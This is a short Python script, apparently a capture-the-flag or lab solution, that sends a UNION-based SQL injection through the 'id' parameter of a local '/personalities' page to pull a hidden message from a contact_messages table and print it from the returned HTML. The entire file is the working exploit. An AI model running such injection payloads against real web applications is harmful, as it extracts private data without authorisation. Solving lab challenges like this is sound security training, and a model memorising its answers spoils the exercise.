import requests
from bs4 import BeautifulSoup
import sys

addr = "0.0.0.0" if len(sys.argv) > 1 else "127.0.0.1"

# Query for getting the secrete message
query = "'UNION SELECT name, message FROM contact_messages WHERE mail LIKE '%james@bond.mi5%"
r = requests.get("http://" + addr + "/personalities?id=" + query)

# Getting the secret message from the html
soup = BeautifulSoup(r.content, 'html.parser')
a_tag = soup.find_all("a")
print(a_tag[0].get_text())